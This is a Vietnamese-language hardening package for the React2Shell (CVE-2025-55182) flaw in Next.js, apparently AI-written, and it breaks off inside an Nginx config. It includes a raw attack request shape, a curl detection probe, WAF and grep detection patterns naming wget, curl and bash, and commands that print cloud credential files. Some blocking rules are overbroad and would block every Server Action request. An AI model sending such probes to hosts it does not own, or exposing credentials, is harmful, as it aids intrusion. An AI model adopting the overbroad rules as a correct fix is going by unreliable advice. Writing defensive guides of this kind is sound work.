# 🛡️ NextJS Security Package - CVE-2025-55182 (React2Shell)

## 📦 Nội Dung Package

Package này chứa tất cả tài liệu, scripts, và configurations cần thiết để bảo vệ hệ thống NextJS của bạn khỏi lỗ hổng **CVE-2025-55182 (React2Shell)** - một lỗ hổng CRITICAL SEVERITY (CVSS 10.0) cho phép Remote Code Execution.

### Files Included:

1. **NEXTJS_SECURITY_CVE-2025-55182_HARDENING.md** (42KB)
   - Tài liệu chính về lỗ hổng
   - Phân tích kỹ thuật chi tiết
   - Hướng dẫn kiểm tra và khắc phục
   - Kiến trúc bảo mật tách biệt Frontend/Backend
   - Code examples đầy đủ
   - Best practices và monitoring

2. **EMERGENCY_CHECKLIST.md** (11KB)
   - Checklist khắc phục khẩn cấp
   - Các bước xử lý trong 15 phút đầu
   - Hướng dẫn phát hiện đã bị hack
   - Quick reference commands
   - Incident response plan

3. **cve-2025-55182-fix.sh** (14KB)
   - Script tự động scan và fix
   - Interactive menu
   - Kiểm tra phiên bản vulnerable
   - Auto-update packages
   - Phát hiện malware
   - Generate security reports

4. **docker-compose-secure.yml** (12KB)
   - Docker configuration bảo mật
   - Tách biệt networks (frontend/backend)
   - Security hardening
   - Resource limits
   - Health checks
   - Logging configuration

5. **NGINX_WAF_CONFIGURATION.md** (20KB)
   - Complete Nginx configuration
   - ModSecurity WAF rules
   - Fail2Ban setup
   - Rate limiting
   - Custom CVE-2025-55182 rules
   - Testing commands

---

## 🚀 Quick Start

### Bước 1: Kiểm Tra Ngay

```bash
# Download và chạy security scan
chmod +x cve-2025-55182-fix.sh
./cve-2025-55182-fix.sh --scan

# Hoặc chạy interactive mode
./cve-2025-55182-fix.sh
```

### Bước 2: Đọc Tài Liệu Chính

```bash
# Đọc tài liệu security hardening
cat NEXTJS_SECURITY_CVE-2025-55182_HARDENING.md | less

# Hoặc mở trong text editor
nano NEXTJS_SECURITY_CVE-2025-55182_HARDENING.md
```

### Bước 3: Thực Hiện Khắc Phục

Tùy thuộc vào tình trạng của bạn:

**Nếu chưa bị hack:**
- Update Next.js lên patched version
- Implement kiến trúc bảo mật mới
- Setup monitoring

**Nếu đã bị hack:**
- Follow EMERGENCY_CHECKLIST.md
- Isolate system ngay lập tức
- Remove malware
- Rebuild từ clean state

---

## 📖 Hướng Dẫn Sử Dụng Chi Tiết

### 1. Security Scan Script

```bash
# Scan all Next.js projects
./cve-2025-55182-fix.sh --scan

# Auto-fix all vulnerable projects
./cve-2025-55182-fix.sh --fix

# Interactive menu
./cve-2025-55182-fix.sh

# Menu options:
# 1. Scan for Next.js projects
# 2. Check vulnerability status
# 3. Auto-fix (update packages)
# 4. Check for malicious activity
# 5. View logs
# 6. Generate security report
# 7. Exit
```

### 2. Docker Deployment

```bash
# Copy docker-compose.yml vào project
cp docker-compose-secure.yml /path/to/your/project/docker-compose.yml

# Tạo .env file
cat > .env << 'EOF'
DB_NAME=your_database
DB_USER=postgres
DB_PASSWORD=change_this_password
REDIS_PASSWORD=change_this_too
JWT_SECRET=very_long_secret_minimum_32_chars
EOF

# Build và start
docker-compose up -d --build

# Check status
docker-compose ps

# View logs
docker-compose logs -f
```

### 3. Nginx + WAF Setup

```bash
# Install ModSecurity
sudo apt update
sudo apt install -y nginx-extras libnginx-mod-security2

# Setup configurations (follow NGINX_WAF_CONFIGURATION.md)

# Test configuration
sudo nginx -t

# Reload
sudo systemctl reload nginx

# Monitor attacks
sudo tail -f /var/log/modsec_audit.log
```

---

## ⚠️ Priority Actions

### CRITICAL (Làm NGAY)

1. ✅ **Check version của Next.js**
   ```bash
   cd /path/to/nextjs-project
   npm list next
   ```

2. ✅ **Nếu vulnerable - Update ngay**
   ```bash
   npm install next@latest
   npm run build
   sudo systemctl restart your-service
   ```

3. ✅ **Scan for malware**
   ```bash
   ./cve-2025-55182-fix.sh
   # Chọn option 4: Check for malicious activity
   ```

### HIGH (Trong 24h)

4. ✅ **Implement WAF rules**
   - Follow NGINX_WAF_CONFIGURATION.md
   - Setup ModSecurity
   - Configure Fail2Ban

5. ✅ **Setup monitoring**
   - Configure log monitoring
   - Setup alerts
   - Enable real-time detection

### MEDIUM (Trong tuần)

6. ✅ **Redesign architecture**
   - Tách biệt Frontend và Backend
   - Implement API Gateway
   - Network isolation

7. ✅ **Security audit**
   - Review tất cả code
   - Check dependencies
   - Penetration testing

---

## 🔍 Verification

Sau khi thực hiện các bước khắc phục:

```bash
# 1. Verify version
npm list next
# Should show patched version

# 2. Check no suspicious processes
ps aux | grep -E "xmrig|miner|crypto"
# Should return nothing

# 3. Check no malicious files
ls -la /tmp/sex.sh /tmp/slt
# Should not exist

# 4. Test with detection request
curl -I https://yourdomain.com/ -H "Next-Action: x"
# Should return 403 Forbidden

# 5. Check logs
tail -f /var/log/nginx/access.log
# Should show no exploitation attempts
```

---

## 📊 Monitoring Setup

### Real-time Alert Script

```bash
# Create monitoring script
cat > /usr/local/bin/monitor-cve-2025-55182.sh << 'EOF'
#!/bin/bash
tail -F /var/log/nginx/access.log | \
grep --line-buffered "next-action\|rsc-action" | \
while read line; do
    IP=$(echo "$line" | awk '{print $1}')
    echo "[ALERT] CVE-2025-55182 attempt from $IP at $(date)"
    # Ban IP
    sudo ufw deny from "$IP"
    # Send email (configure your email)
    echo "Attack detected from $IP" | mail -s "SECURITY ALERT" admin@yourdomain.com
done
EOF

chmod +x /usr/local/bin/monitor-cve-2025-55182.sh

# Run in background
nohup /usr/local/bin/monitor-cve-2025-55182.sh &
```

### Daily Security Scan

```bash
# Add to crontab
crontab -e

# Add this line:
0 2 * * * /path/to/cve-2025-55182-fix.sh --scan > /var/log/daily-security-scan.log 2>&1
```

---

## 🆘 Emergency Contacts

Nếu phát hiện đã bị hack:

1. **IMMEDIATE**: Isolate server
   ```bash
   sudo ufw deny in from any
   sudo systemctl stop nextjs nginx
   ```

2. **Contact**:
   - Security team: security@your-company.com
   - Hosting provider: support@provider.com
   - Incident response: +84-xxx-xxx-xxxx

3. **Follow**: EMERGENCY_CHECKLIST.md

---

## 📚 Additional Resources

### Official Advisories
- Next.js: https://nextjs.org/blog/CVE-2025-66478
- React: https://react.dev/blog/2025/12/03/critical-security-vulnerability-rsc
- React2Shell: https://react2shell.com

### Security Research
- Wiz Research: https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
- AWS Security: https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell-vulnerability-cve-2025-55182/
- Datadog: https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell

### IOCs
- Datadog IOCs: https://github.com/DataDog/indicators-of-compromise/tree/main/react-CVE-2025-55182

---

## 🎯 Roadmap

### Phase 1: Immediate (Day 1)
- [ ] Verify vulnerability
- [ ] Update packages
- [ ] Basic monitoring

### Phase 2: Short-term (Week 1)
- [ ] WAF implementation
- [ ] Advanced monitoring
- [ ] Security audit

### Phase 3: Long-term (Month 1)
- [ ] Architecture redesign
- [ ] Full security review
- [ ] Team training

---

## ✅ Checklist Tổng Hợp

### Technical
- [ ] Next.js updated to patched version
- [ ] React updated (if needed)
- [ ] npm audit fix completed
- [ ] Application rebuilt
- [ ] Services restarted
- [ ] WAF rules deployed
- [ ] Monitoring active
- [ ] Logs configured
- [ ] Backups verified

### Security
- [ ] No suspicious processes
- [ ] No malicious files
- [ ] No unauthorized connections
- [ ] No malicious cron jobs
- [ ] Firewall configured
- [ ] Rate limiting active
- [ ] SSL/TLS verified

### Operational
- [ ] Team notified
- [ ] Documentation updated
- [ ] Incident response plan ready
- [ ] Contacts updated
- [ ] Monitoring alerts configured

---

## 🤝 Support

Nếu cần hỗ trợ:

1. **Documentation**: Đọc kỹ NEXTJS_SECURITY_CVE-2025-55182_HARDENING.md
2. **Emergency**: Follow EMERGENCY_CHECKLIST.md
3. **Community**: 
   - Next.js Discord: https://discord.gg/nextjs
   - Reddit r/nextjs: https://reddit.com/r/nextjs
   - Stack Overflow: [nextjs] tag

---

## 📝 Notes

- **Backup trước khi thay đổi bất cứ thứ gì**
- **Test trong staging environment trước**
- **Monitor logs sau mọi changes**
- **Document tất cả changes**
- **Keep này package updated với latest patches**

---

## 🔄 Update Log

**Version 1.0 - December 9, 2025**
- Initial release
- Complete CVE-2025-55182 documentation
- Security scripts and configurations
- Emergency response procedures

---

## 📄 License

Tài liệu này được tạo ra cho mục đích bảo mật và giáo dục.  
Sử dụng tự do nhưng tự chịu trách nhiệm.  
Luôn backup và test trước khi apply lên production.

---

## ⚠️ Disclaimer

- Tài liệu này dựa trên research và best practices tính đến ngày 9/12/2025
- Lỗ hổng và exploits có thể tiến triển
- Luôn theo dõi official advisories
- Không có giải pháp nào đảm bảo 100% an toàn
- Security là một process liên tục, không phải một lần và xong

---

**Created by:** Claude (Anthropic)  
**Date:** December 9, 2025  
**Version:** 1.0  
**For:** NextJS CVE-2025-55182 Protection

**Status:** ✅ Production Ready  
**Priority:** 🔴 CRITICAL - Deploy ASAP

---

## 🚨 Final Reminder

**Lỗ hổng này ĐÃ BỊ KHAI THÁC trong thực tế!**

State-sponsored attackers và cybercriminals đang actively scan và exploit. Thời gian là then chốt. Hãy hành động NGAY!

Good luck và stay safe! 🛡️
-e 

---
# PHẦN 1: TÀI LIỆU BẢO MẬT CHÍNH
---


# Tài Liệu Bảo Mật: CVE-2025-55182 (React2Shell) và Hardening NextJS

## 📋 Mục Lục
1. [Tổng Quan Lỗ Hổng](#tổng-quan-lỗ-hổng)
2. [Phân Tích Kỹ Thuật](#phân-tích-kỹ-thuật)
3. [Phiên Bản Bị Ảnh Hưởng](#phiên-bản-bị-ảnh-hưởng)
4. [Kiểm Tra Hệ Thống](#kiểm-tra-hệ-thống)
5. [Khắc Phục Khẩn Cấp](#khắc-phục-khẩn-cấp)
6. [Kiến Trúc Bảo Mật](#kiến-trúc-bảo-mật)
7. [Monitoring và Detection](#monitoring-và-detection)
8. [Indicators of Compromise](#indicators-of-compromise)
9. [Best Practices](#best-practices)
10. [Tài Nguyên Tham Khảo](#tài-nguyên-tham-khảo)

---

## ⚠️ CẢNH BÁO KHẨN CẤP

**CVE-2025-55182 (React2Shell)** là lỗ hổng **CRITICAL SEVERITY** (CVSS 10.0/10.0) cho phép:
- ✅ Remote Code Execution (RCE) không cần xác thực
- ✅ Chiếm quyền root/administrator của VPS
- ✅ Cài đặt crypto miner, backdoor, ransomware
- ✅ Đánh cắp credentials, secrets, database access
- ✅ Phá hoại hệ thống (GRUB bootloader, file system)

**ĐÃ BỊ KHAI THÁC TRONG THỰC TẾ** bởi các threat actors từ Trung Quốc và cybercriminals trong vòng vài giờ sau khi công bố (3/12/2025).

---

## 1. Tổng Quan Lỗ Hổng

### 1.1. Thông Tin Cơ Bản

| Thuộc tính | Giá trị |
|-----------|---------|
| **CVE ID** | CVE-2025-55182 (React), CVE-2025-66478 (Next.js - đã bị reject vì duplicate) |
| **Tên gọi** | React2Shell |
| **CVSS Score** | 10.0 (Maximum Severity) |
| **Attack Vector** | Network (Remote) |
| **Authentication** | None Required (Unauthenticated) |
| **User Interaction** | None Required |
| **Impact** | Complete System Compromise |
| **Ngày công bố** | 3 December 2025 |
| **Người phát hiện** | Lachlan Davidson |

### 1.2. Mô Tả Lỗ Hổng

CVE-2025-55182 là lỗ hổng **unsafe deserialization** trong React Server Components (RSC) Flight protocol. Lỗ hổng cho phép attacker:

1. Gửi một HTTP request được craft đặc biệt đến bất kỳ Server Function endpoint nào
2. Payload độc hại được deserialize không an toàn bởi react-server
3. Dữ liệu do attacker kiểm soát ảnh hưởng đến server-side execution logic
4. Kết quả: **Remote Code Execution** với quyền của Node.js process

**Đặc điểm nguy hiểm:**
- ✅ Không cần authentication
- ✅ Default configuration đã vulnerable
- ✅ App tạo bằng `create-next-app` có thể bị exploit ngay
- ✅ Kể cả khi app không có Server Function endpoints, vẫn vulnerable nếu support RSC
- ✅ Exploit có độ tin cậy gần 100%

### 1.3. Tác Động Thực Tế

**Đã quan sát được trong thực tế:**
- 🔴 Cài đặt crypto miners (XMRig, other mining tools)
- 🔴 Triển khai backdoors (Sliver, Cobalt Strike)
- 🔴 Đánh cắp cloud credentials (AWS IAM, GCP, Azure)
- 🔴 Harvesting secrets (.env, .ssh, .aws, .kube, wallets)
- 🔴 Phá hoại GRUB bootloader
- 🔴 Lateral movement trong cloud environments
- 🔴 Ransomware deployment

**Thống kê:**
- 39% cloud environments có instances vulnerable
- 12+ million websites có thể bị ảnh hưởng
- Exploitation bắt đầu trong vòng vài giờ sau khi công bố
- State-sponsored threat actors (China) và cybercriminals đã weaponize

---

## 2. Phân Tích Kỹ Thuật

### 2.1. Root Cause

Lỗ hổng nằm trong cách react-server package xử lý RSC payloads qua Flight protocol:

```javascript
// Vulnerable code flow trong react-server-dom-webpack
function requireModule(id) {
  // Attacker có thể control 'id' thông qua crafted payload
  // Dẫn đến việc call vm.runInThisContext() với attacker-controlled code
}
```

### 2.2. Attack Vector

**HTTP Request Pattern:**
```http
POST / HTTP/1.1
Host: vulnerable-nextjs-app.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Next-Action: x
X-Nextjs-Request-Id: random-id
Next-Router-State-Tree: ["",{"children":["__PAGE__",{},null,null]},null,null,true]

------WebKitFormBoundary
Content-Disposition: form-data; name="0"

["$MALICIOUS_PAYLOAD"]
------WebKitFormBoundary--
```

**Malicious Payload Structure:**
- Attacker craft RSC payload với self-referencing "gadget chains"
- Exploit prototype pollution trong deserialization
- Trigger `vm.runInThisContext()` với arbitrary code
- Bypass validation checks

### 2.3. Affected Components

```
react-server-dom-webpack
react-server-dom-parcel  
react-server-dom-turbopack
└── Vulnerable versions: 19.0.0, 19.1.0, 19.1.1, 19.2.0

Next.js (sử dụng App Router)
└── Vulnerable: >=14.3.0-canary.77, all 15.x, all 16.x (unpatched)

Other frameworks:
├── React Router RSC preview
├── RedwoodJS/SDK
├── Waku
├── Vite RSC plugin
└── Parcel RSC plugin
```

---

## 3. Phiên Bản Bị Ảnh Hưởng

### 3.1. React Server Components

**Vulnerable Versions:**
- `react-server-dom-webpack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `react-server-dom-parcel`: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- `react-server-dom-turbopack`: 19.0.0, 19.1.0, 19.1.1, 19.2.0

**Patched Versions:**
- ✅ React 19.0.1
- ✅ React 19.1.2
- ✅ React 19.2.1

### 3.2. Next.js

**Vulnerable Versions:**
- ❌ Next.js 14.3.0-canary.77 và tất cả canary releases sau đó
- ❌ Next.js 15.0.0 - 15.0.4
- ❌ Next.js 15.1.0 - 15.1.8
- ❌ Next.js 15.2.0 - 15.2.5
- ❌ Next.js 15.3.0 - 15.3.5
- ❌ Next.js 15.4.0 - 15.4.7
- ❌ Next.js 15.5.0 - 15.5.6
- ❌ Next.js 16.0.0 - 16.0.6

**Patched Versions:**
- ✅ Next.js 15.0.5
- ✅ Next.js 15.1.9
- ✅ Next.js 15.2.6
- ✅ Next.js 15.3.6
- ✅ Next.js 15.4.8
- ✅ Next.js 15.5.7
- ✅ Next.js 16.0.7

**QUAN TRỌNG:**
- Next.js 13.x: **KHÔNG BỊ ẢNH HƯỞNG**
- Next.js 14.x stable (không phải canary): **KHÔNG BỊ ẢNH HƯỞNG**
- Pages Router: **KHÔNG BỊ ẢNH HƯỞNG**
- **CHỈ App Router** bị ảnh hưởng

### 3.3. Trường Hợp Của Bạn

Theo thông tin bạn cung cấp:
- ❌ **Next.js 14**: Nếu đang dùng canary >= 14.3.0-canary.77 → **VULNERABLE**
- ❌ **Next.js 16**: Tất cả version 16.x trước 16.0.7 → **VULNERABLE**

**HÀNH ĐỘNG CẦN THIẾT:** Update ngay lập tức!

---

## 4. Kiểm Tra Hệ Thống

### 4.1. Kiểm Tra Phiên Bản

```bash
# Check Next.js version
cd /path/to/your/nextjs-app
npm list next

# Check React version
npm list react react-dom

# Check cho React Server packages
npm list | grep react-server-dom
```

### 4.2. Kiểm Tra Cấu Hình

```javascript
// Check file next.config.js
// Nếu sử dụng App Router (có thư mục app/) → Có thể vulnerable
// Nếu chỉ dùng Pages Router (chỉ có thư mục pages/) → Không vulnerable

// Check structure:
your-nextjs-project/
├── app/           ← App Router (VULNERABLE nếu version cũ)
├── pages/         ← Pages Router (SAFE)
└── package.json
```

### 4.3. Tool Kiểm Tra Tự Động

**Option 1: Sử dụng npx tool:**
```bash
# Next.js official scanner
npx fix-react2shell-next

# Tool này sẽ:
# - Check version hiện tại
# - Đề xuất patched version
# - Tự động update nếu đồng ý
```

**Option 2: Manual detection request (CẨUN THẬN - chỉ test trên local):**
```bash
# Test detection (KHÔNG gây hại, chỉ check)
curl -X POST http://localhost:3000 \
  -H "Next-Action: x" \
  -H "X-Nextjs-Request-Id: test123" \
  -H 'Next-Router-State-Tree: ["",{"children":["__PAGE__",{},null,null]},null,null,true]' \
  -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
  -d '------WebKitFormBoundary
Content-Disposition: form-data; name="0"

["$1:a:a"]
------WebKitFormBoundary
Content-Disposition: form-data; name="1"

{}
------WebKitFormBoundary--'

# Nếu vulnerable: HTTP 500 error
# Nếu patched: Request bị ignore/reject properly
```

### 4.4. Kiểm Tra Log Files

```bash
# Check access logs cho suspicious patterns
grep -i "next-action\|rsc-action" /var/log/nginx/access.log
grep -i "multipart/form-data" /var/log/nginx/access.log | grep "POST"

# Check cho exploitation attempts
grep -E "wget|curl|bash|sh|cmd|powershell" /var/log/nginx/access.log

# Check system logs
journalctl -u your-nextjs-service --since "2025-12-03" | grep -i error
```

### 4.5. Kiểm Tra Dấu Hiệu Đã Bị Hack

```bash
# 1. Check processes đang chạy
ps aux | grep -E "xmrig|miner|crypto|coin"
ps aux | grep -E "wget|curl" | grep -v grep

# 2. Check network connections
netstat -antp | grep ESTABLISHED
ss -tunap | grep :443

# 3. Check cron jobs
crontab -l
cat /etc/cron*/*

# 4. Check startup services
systemctl list-units --type=service --state=running

# 5. Check recent file modifications
find /root -type f -mtime -7 -ls
find /home -type f -mtime -7 -ls
find /tmp -type f -mtime -1 -ls

# 6. Check GRUB bootloader
ls -la /boot/grub/grub.cfg
grub-install --version

# 7. Check cho backdoors
find / -name "*.sh" -mtime -7 2>/dev/null
find / -name "sex.sh" 2>/dev/null  # Known malware filename

# 8. Check cloud credentials
find ~ -name ".aws" -o -name ".kube" -o -name ".config/gcloud"
cat ~/.aws/credentials 2>/dev/null
cat ~/.kube/config 2>/dev/null
```

---

## 5. Khắc Phục Khẩn Cấp

### 5.1. Bước 1: Immediate Patching (ƯU TIÊN CAO NHẤT)

```bash
# CRITICAL: Update ngay lập tức

# Cho Next.js 15.x:
npm install next@15.5.7
# Hoặc với specific version theo major version của bạn

# Cho Next.js 16.x:
npm install next@16.0.7

# Cho Next.js 14.x canary (downgrade về stable):
npm install next@14.2.18  # Latest stable 14.x

# Update React dependencies (nếu cần):
npm install react@19.2.1 react-dom@19.2.1

# Rebuild application:
npm run build

# Restart service:
pm2 restart all
# Hoặc
systemctl restart your-nextjs-service
```

**Tool tự động:**
```bash
npx fix-react2shell-next
```

### 5.2. Bước 2: Deploy WAF Rules (Ngay lập tức)

Nếu bạn đang dùng VPS và chưa có WAF, cài đặt ngay:

**Option A: ModSecurity (Free, Open Source)**

```bash
# Install ModSecurity với Nginx
sudo apt update
sudo apt install -y nginx-extras libnginx-mod-security2

# Enable ModSecurity
sudo vim /etc/nginx/modsec/modsecurity.conf
# Set: SecRuleEngine On

# Add custom rule cho CVE-2025-55182:
sudo vim /etc/nginx/modsec/custom-rules.conf
```

```nginx
# CVE-2025-55182 Protection Rules
SecRule REQUEST_HEADERS:Next-Action "@rx ." \
    "id:2025001,\
    phase:1,\
    block,\
    log,\
    msg:'CVE-2025-55182 React2Shell Exploitation Attempt',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    severity:'CRITICAL',\
    chain"
    SecRule REQUEST_METHOD "@streq POST" \
        "chain"
        SecRule REQUEST_HEADERS:Content-Type "@contains multipart/form-data"

SecRule REQUEST_HEADERS:X-Nextjs-Request-Id "@rx ." \
    "id:2025002,\
    phase:1,\
    block,\
    log,\
    msg:'CVE-2025-55182 Suspicious Next.js Request Header',\
    severity:'CRITICAL',\
    chain"
    SecRule REQUEST_HEADERS:Next-Router-State-Tree "@rx ."

# Block malformed RSC payloads
SecRule REQUEST_BODY "@rx \[\"\$[^\]]+\"\]" \
    "id:2025003,\
    phase:2,\
    block,\
    log,\
    msg:'CVE-2025-55182 Malicious RSC Payload Pattern',\
    severity:'CRITICAL'"
```

```bash
# Reload Nginx
sudo nginx -t
sudo systemctl reload nginx
```

**Option B: Cloudflare (Nếu dùng)**

Cloudflare đã tự động deploy WAF rules cho tất cả customers. Đảm bảo:
```
1. Traffic được proxy qua Cloudflare (orange cloud)
2. WAF/Firewall được enable
3. Check Security Events trong dashboard
```

**Option C: Nginx Rate Limiting (Temporary mitigation)**

```nginx
# Thêm vào nginx.conf
http {
    # Rate limit zone
    limit_req_zone $binary_remote_addr zone=nextjs_limit:10m rate=5r/s;
    limit_req_status 429;
    
    # Connection limit
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    
    server {
        listen 80;
        server_name your-domain.com;
        
        # Apply rate limiting to RSC endpoints
        location / {
            limit_req zone=nextjs_limit burst=10 nodelay;
            limit_conn conn_limit 10;
            
            # Block suspicious headers
            if ($http_next_action) {
                return 403;
            }
            
            if ($http_x_nextjs_request_id) {
                if ($request_method = POST) {
                    return 403;
                }
            }
            
            proxy_pass http://localhost:3000;
        }
    }
}
```

### 5.3. Bước 3: Network Segmentation (Ngay)

```bash
# Sử dụng firewall để restrict access

# UFW (Ubuntu)
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable

# iptables (Advanced)
sudo iptables -A INPUT -p tcp --dport 3000 -s 127.0.0.1 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 3000 -j DROP
sudo iptables-save > /etc/iptables/rules.v4
```

### 5.4. Bước 4: Isolate NextJS Process

```bash
# Chạy NextJS với restricted user
sudo useradd -r -s /bin/false nextjs-user
sudo chown -R nextjs-user:nextjs-user /path/to/nextjs-app

# Update PM2/systemd service
sudo vim /etc/systemd/system/nextjs.service
```

```ini
[Unit]
Description=Next.js Application
After=network.target

[Service]
Type=simple
User=nextjs-user
Group=nextjs-user
WorkingDirectory=/path/to/nextjs-app
ExecStart=/usr/bin/node /path/to/nextjs-app/.next/standalone/server.js
Restart=always
RestartSec=10

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/path/to/nextjs-app
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl restart nextjs
```

### 5.5. Bước 5: Monitoring Setup (Ngay)

```bash
# Cài đặt monitoring tools
npm install --save-dev @datadog/browser-logs
# Hoặc
npm install winston

# Setup log aggregation
sudo apt install -y rsyslog
```

---

## 6. Kiến Trúc Bảo Mật

### 6.1. Architecture Overview

**CURRENT (Vulnerable):**
```
Internet → NextJS (Frontend + RSC) → PostgreSQL
              ↓
          Direct Server Access (DANGEROUS!)
```

**RECOMMENDED (Secure):**
```
Internet → WAF/CDN → Reverse Proxy (Nginx) → NextJS Frontend
                                                   ↓ (API Gateway)
                                              Backend API (Node.js)
                                                   ↓
                                              PostgreSQL
```

### 6.2. Tách Biệt Frontend và Backend

#### 6.2.1. Backend API (Node.js + Express)

```javascript
// backend/server.js
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const jwt = require('jsonwebtoken');
const cors = require('cors');

const app = express();

// Security middleware
app.use(helmet());
app.use(express.json({ limit: '10mb' }));

// CORS configuration - CHỈ cho phép frontend domain
const corsOptions = {
  origin: process.env.FRONTEND_URL || 'https://yourdomain.com',
  credentials: true,
  optionsSuccessStatus: 200,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization']
};
app.use(cors(corsOptions));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP',
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', limiter);

// JWT verification middleware
const verifyToken = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(403).json({ error: 'Invalid token' });
  }
};

// Authentication endpoint
app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    // Validate credentials (implement your logic)
    const user = await validateUser(email, password);
    
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Generate JWT
    const token = jwt.sign(
      { 
        userId: user.id,
        email: user.email,
        role: user.role 
      },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );
    
    // Send token in httpOnly cookie
    res.cookie('auth_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });
    
    res.json({ 
      success: true,
      user: {
        id: user.id,
        email: user.email,
        role: user.role
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Protected API routes
app.get('/api/user/profile', verifyToken, async (req, res) => {
  try {
    // Get user data from database
    const user = await getUserById(req.user.userId);
    res.json({ user });
  } catch (error) {
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, '127.0.0.1', () => {
  console.log(`Backend API listening on port ${PORT}`);
});
```

```bash
# backend/.env
NODE_ENV=production
PORT=4000
JWT_SECRET=your-super-secret-key-here-change-this
DATABASE_URL=postgresql://user:pass@localhost:5432/dbname
FRONTEND_URL=https://yourdomain.com
```

#### 6.2.2. NextJS Frontend (CHỈ làm presentation layer)

```typescript
// frontend/app/api/auth/login/route.ts
import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    
    // FORWARD request đến backend API
    const backendResponse = await fetch(`${process.env.BACKEND_API_URL}/api/auth/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });
    
    const data = await backendResponse.json();
    
    if (!backendResponse.ok) {
      return NextResponse.json(data, { status: backendResponse.status });
    }
    
    // Forward cookie từ backend
    const response = NextResponse.json(data);
    const authCookie = backendResponse.headers.get('set-cookie');
    
    if (authCookie) {
      response.headers.set('set-cookie', authCookie);
    }
    
    return response;
  } catch (error) {
    console.error('Proxy error:', error);
    return NextResponse.json(
      { error: 'Failed to connect to authentication service' },
      { status: 500 }
    );
  }
}
```

```typescript
// frontend/lib/api.ts
export class ApiClient {
  private baseUrl: string;
  
  constructor() {
    // ALWAYS call backend through API routes, NEVER directly from client
    this.baseUrl = '/api';
  }
  
  async request(endpoint: string, options: RequestInit = {}) {
    const url = `${this.baseUrl}${endpoint}`;
    
    const config: RequestInit = {
      ...options,
      headers: {
        'Content-Type': 'application/json',
        ...options.headers,
      },
      credentials: 'include', // Include cookies
    };
    
    try {
      const response = await fetch(url, config);
      
      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message || 'API request failed');
      }
      
      return await response.json();
    } catch (error) {
      console.error('API request error:', error);
      throw error;
    }
  }
  
  async get(endpoint: string) {
    return this.request(endpoint, { method: 'GET' });
  }
  
  async post(endpoint: string, data: any) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data),
    });
  }
}

export const api = new ApiClient();
```

```typescript
// frontend/middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
  // Verify authentication on protected routes
  const protectedPaths = ['/dashboard', '/profile', '/admin'];
  const { pathname } = request.nextUrl;
  
  const isProtectedPath = protectedPaths.some(path => 
    pathname.startsWith(path)
  );
  
  if (isProtectedPath) {
    const token = request.cookies.get('auth_token');
    
    if (!token) {
      return NextResponse.redirect(new URL('/login', request.url));
    }
    
    // Additional token validation nếu cần
  }
  
  return NextResponse.next();
}

export const config = {
  matcher: [
    '/((?!_next/static|_next/image|favicon.ico).*)',
  ],
};
```

```bash
# frontend/.env.local
BACKEND_API_URL=http://localhost:4000
NEXT_PUBLIC_SITE_URL=https://yourdomain.com
```

### 6.3. Nginx Reverse Proxy Configuration

```nginx
# /etc/nginx/sites-available/your-app

# Rate limiting zones
limit_req_zone $binary_remote_addr zone=api_limit:10m rate=10r/s;
limit_req_zone $binary_remote_addr zone=general_limit:10m rate=30r/s;
limit_conn_zone $binary_remote_addr zone=conn_limit:10m;

# Upstream definitions
upstream nextjs_frontend {
    server 127.0.0.1:3000;
    keepalive 64;
}

upstream nodejs_backend {
    server 127.0.0.1:4000;
    keepalive 64;
}

server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name yourdomain.com www.yourdomain.com;
    
    # SSL Configuration
    ssl_certificate /path/to/fullchain.pem;
    ssl_certificate_key /path/to/privkey.pem;
